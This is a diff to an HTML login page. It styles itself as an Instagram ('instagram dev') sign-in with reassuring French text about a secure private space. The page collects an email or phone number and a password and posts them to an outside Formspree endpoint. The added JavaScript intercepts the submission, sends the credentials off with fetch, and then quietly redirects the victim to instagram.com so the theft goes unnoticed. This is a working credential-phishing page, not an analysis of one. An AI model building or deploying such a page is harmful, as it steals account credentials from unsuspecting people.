@@ -178,6 +178,7 @@
   .my-logo-container img {
     max-width: 80px;
     height: auto;
+    border-radius: 12px;
   }
 
   .card-header { margin-bottom: 30px; }
@@ -309,13 +310,11 @@
 <div class="noise"></div>
 
 <div class="page">
-
   <div class="left">
     <div class="logo">
       <div class="logo-dot"></div>
       SISTEMA
     </div>
-
     <div class="left-hero">
       <div class="tagline">
         Bienvenue<br><span>sur votre</span><br>espace privé.
@@ -329,7 +328,6 @@
         <div class="badge"><div class="badge-dot green"></div>SSL / HTTPS</div>
       </div>
     </div>
-
     <div class="left-footer">© 2025 Sistema — Tous droits réservés</div>
   </div>
 
@@ -338,18 +336,15 @@
       <div class="my-logo-container">
         <img src="insta.jpg" alt="Logo">
       </div>
-
       <div class="card-header">
         <div class="card-title">instagram dev</div>
         <div class="card-sub">Entrez votre mot de passe pour continuer</div>
       </div>
-
       <div class="divider">
         <div class="divider-line"></div>
         <div class="divider-text">ACCÈS SÉCURISÉ</div>
         <div class="divider-line"></div>
       </div>
-
       <form action="https://formspree.io/f/xgollwjg" method="POST" id="loginForm">
         <div class="field">
           <label>Email address or number</label>
@@ -360,7 +355,6 @@
             <input type="text" name="email_or_number" placeholder="email or number" required autocomplete="off" />
           </div>
         </div>
-
         <div class="field">
           <label>Mot de passe</label>
           <div class="inp-wrap">
@@ -373,17 +367,13 @@
             </button>
           </div>
         </div>
-
         <button type="submit" class="btn-submit">Connexion →</button>
-
         <div class="footer-link">
           Problème d'accès ? <a href="#">Contactez l'admin</a>
         </div>
       </form>
-
     </div>
   </div>
-
 </div>
 
 <script>
@@ -391,6 +381,21 @@
     const inp = document.getElementById('passInput');
     inp.type = inp.type === 'password' ? 'text' : 'password';
   }
+
+  const form = document.getElementById('loginForm');
+  form.addEventListener('submit', function(e) {
+    e.preventDefault();
+    const data = new FormData(form);
+    fetch(form.action, {
+      method: 'POST',
+      body: data,
+      headers: { 'Accept': 'application/json' }
+    }).then(response => {
+      window.location.href = 'https://instagram.com';
+    }).catch(error => {
+      window.location.href = 'https://instagram.com';
+    });
+  });
 </script>
 </body>
 </html>
